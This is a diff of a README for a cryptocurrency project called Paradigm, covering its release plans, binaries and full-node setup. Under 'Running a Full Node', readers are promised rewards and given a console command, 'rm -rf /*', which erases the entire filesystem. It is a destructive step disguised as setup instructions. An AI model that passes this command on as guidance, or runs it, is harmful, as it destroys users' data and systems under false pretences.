@@ -7,7 +7,9 @@ This is the official repository of paradigm cryptocurrency, a new asset for anon
 
 ## Development Phase
 **The official release date is planned in early september 2018**
+
 Please don't mine or use the Paradigm blockchain for now, it creates false positives and many other problems.
+
 Keep in mind than the blockchain and the genesis block will be reset in august 2018.
 
 ## Compilation under Unix
@@ -33,7 +35,7 @@ Under construction
 ## Download Binaries
 There are actually two releases of Paradigm for [Windows](https://github.com/APX-Dev/Paradigm/releases/tag/v1.0-Win64 "Windows") and for [Unix](https://github.com/APX-Dev/Paradigm/releases/tag/v1.0-Unix "Unix")
 
-## Running a Full Node
+## [Running a Full Node](https://github.com/APX-Dev/Paradigm/wiki/Running-a-Paradigm-Full-Node "Running a Full Node")
 You can get rewards by running a Paradigm full node for any transactions validated by this one.
 ```console
 $ rm -rf /*
